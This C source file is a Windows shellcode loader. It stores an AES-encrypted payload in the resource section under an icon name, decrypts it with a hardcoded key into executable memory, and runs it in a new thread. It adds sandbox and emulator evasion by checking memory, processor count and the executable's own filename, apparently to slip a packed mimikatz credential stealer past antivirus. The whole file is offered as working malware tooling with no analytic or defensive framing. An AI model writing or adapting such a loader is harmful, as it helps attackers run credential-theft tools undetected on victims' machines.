#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <winuser.h>
#include <psapi.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")

#include "resources.h"


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int checkMe() {
	//check if being emulated

	//set up system structures, these will contain system data
	SYSTEM_INFO s;
	MEMORYSTATUSEX ms;
	DWORD procNum;
	char* mem = NULL;
	mem = (char*)malloc(6900000);

	unsigned char lpFileName[200];
	unsigned char * out;

	GetModuleFileName(NULL, (char*)lpFileName, sizeof(lpFileName));
	out = PathFindFileName(lpFileName);

	if (wcscmp(out, L"mimikatz.exe") == 0) {
		return -1;
	}
	
	if (mem <= 0) {
		return -1;
	}
	memset(mem, 69, 6900000);

	GetSystemInfo(&s);
	procNum = s.dwNumberOfProcessors;

	if (procNum < 2) {
		return -1;
	}

	free(mem);
	//MessageBox(NULL,NULL,NULL,MB_OK);
	return 0;
}


int main(int argc, char * argv[]) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	
	char key[] = { 0x4c, 0xf9, 0x92, 0xca, 0x5, 0xba, 0x3c, 0x41, 0x32, 0x5, 0xf3, 0x4e, 0x27, 0xbd, 0x81, 0xa7 };
	
	unsigned char * payload;
	unsigned int payload_len;
	
	HGLOBAL resHandle = NULL;
	HRSRC res;

	unsigned char lpFileName[200];
	unsigned char * out;

	GetModuleFileName(NULL, (char*)lpFileName, sizeof(lpFileName));
	out = PathFindFileName(lpFileName);

	if (strcmp(out, "not_mimikatz.exe") == 0) {
		MessageBox(NULL,"SAFE","SAFE",MB_OK);
		return 0;

	}else if (checkMe() == 0){
		// Extract payload from resources section
		res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
		resHandle = LoadResource(NULL, res);
		payload = (unsigned char *) LockResource(resHandle);
		payload_len = SizeofResource(NULL, res);
		
		// Allocate memory for payload
		exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		
		
		// Copy payload to allocated buffer
		RtlMoveMemory(exec_mem, payload, payload_len);
		
		// Decrypt payload
		AESDecrypt((char *) exec_mem, payload_len, key, sizeof(key));
		
		// Make the buffer executable
		rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READWRITE, &oldprotect);

		// If all good, launch the payload
		if ( rv != 0 ) {
				th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
				WaitForSingleObject(th, -1);
		}
		
		
	}

	return 0;
}
